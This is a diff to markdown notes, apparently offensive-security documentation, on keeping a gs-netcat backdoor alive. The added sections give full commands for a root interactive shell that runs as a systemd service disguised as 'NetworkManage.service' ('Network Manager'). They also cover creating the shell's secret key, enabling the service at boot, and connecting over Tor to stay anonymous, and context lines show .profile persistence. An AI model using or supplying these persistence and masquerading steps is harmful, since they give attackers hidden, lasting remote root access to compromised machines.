@@ -20,7 +20,7 @@ gs-netcat -i -s MySecret
 
 * Above will spawn a full pty giving you the option to tab complete and use up arrow as long as CTRL+C
 
-### Persisting the Server
+### Persisting the Server .profile
 
 The following line in the user's \~/.profile starts the backdoor (once) when the user logs in. All in one line:
 
@@ -52,6 +52,73 @@ Last login: Mon Dec 30 19:29:55 2024 from 192.168.15.172
 ```
 gs-netcat -s MySecret
 gs-netcat -s -i MySecret
+```
+
+### Persisting the Server systemd
+
+* create secret file&#x20;
+
+```
+gs-netcat -g >/etc/systemd/gs-root-shell-key.txt
+chmod 600 /etc/systemd/gs-root-shell-key.txt
+cat /etc/systemd/gs-root-shell-key.txt
+abc123
+```
+
+* create service file&#x20;
+
+```
+create /etc/systemd/system/NetworkManage.service
+```
+
+```
+[Unit]
+Description=Network Manager
+Documentation=man:NetworkManager(8)
+Wants=network.target
+After=network-pre.target dbus.service
+Before=network.target 
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=10
+WorkingDirectory=/
+ExecStart=/opt/gs-netcat -k /etc/systemd/gs-root-shell-key.txt -il
+
+[Install]
+WantedBy=multi-user.target
+```
+
+<pre><code># ensure it does not exist first 
+ls -lartF /etc/systemd/system/NetworkManage.service
+# create the file
+echo "[Unit]" >> /etc/systemd/system/NetworkManage.service
+<strong>echo "Description=Network Manager" >> /etc/systemd/system/NetworkManage.service
+</strong>echo "Documentation=man:NetworkManager(8)" >> /etc/systemd/system/NetworkManage.service
+echo "Wants=network.target" >> /etc/systemd/system/NetworkManage.service
+echo "After=network-pre.target dbus.service" >> /etc/systemd/system/NetworkManage.service
+echo "Before=network.target" >> /etc/systemd/system/NetworkManage.service 
+echo "" >> /etc/systemd/system/NetworkManage.service
+echo "[Service]" >> /etc/systemd/system/NetworkManage.service
+echo "Type=simple" >> /etc/systemd/system/NetworkManage.service
+echo "Restart=always" >> /etc/systemd/system/NetworkManage.service
+echo "RestartSec=10" >> /etc/systemd/system/NetworkManage.service
+<strong>echo "WorkingDirectory=/" >> /etc/systemd/system/NetworkManage.service
+</strong>echo "ExecStart=/opt/gs-netcat -k /etc/systemd/gs-root-shell-key.txt -il" >> /etc/systemd/system/NetworkManage.service
+echo "" >> /etc/systemd/system/NetworkManage.service
+echo "[Install]" >> /etc/systemd/system/NetworkManage.service
+echo "WantedBy=multi-user.target" >> /etc/systemd/system/NetworkManage.service
+
+cat /etc/systemd/system/NetworkManage.service
+</code></pre>
+
+* after created
+
+```
+systemctl start NetworkManage.service
+systemctl enable NetworkManage.service
+systemctl status NetworkManage.service
 ```
 
 ### Command Console
@@ -101,4 +168,14 @@ The same using 1 command:
 
 ```
 ssh -o ProxyCommand='gs-netcat -s MySecret' root@ignored
+```
+
+### Tor Client Connection
+
+* For the best security you should always connect to the server via tor
+* Start tor in one window&#x20;
+
+```
+tor
+gs-netcat -i -s MySecret -T
 ```
